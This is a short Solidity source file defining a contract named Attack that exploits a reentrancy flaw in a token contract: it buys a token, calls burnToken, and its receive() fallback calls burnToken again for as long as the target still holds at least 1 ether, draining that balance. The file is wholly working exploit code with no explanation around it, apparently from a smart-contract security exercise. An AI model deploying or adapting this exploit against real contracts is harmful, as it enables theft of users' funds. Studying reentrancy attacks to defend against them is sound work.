// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IToken {
    function buyToken() external payable;

    function burnToken(uint256 amount) external;
}

contract Attack {
    IToken public token;

    constructor(address _token) {
        token = IToken(_token);
    }

    receive() external payable {
        if (address(token).balance >= 1 ether) {
            token.burnToken(1 ether);
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        token.buyToken{value: 1 ether}();
        token.burnToken(1 ether);
    }
}
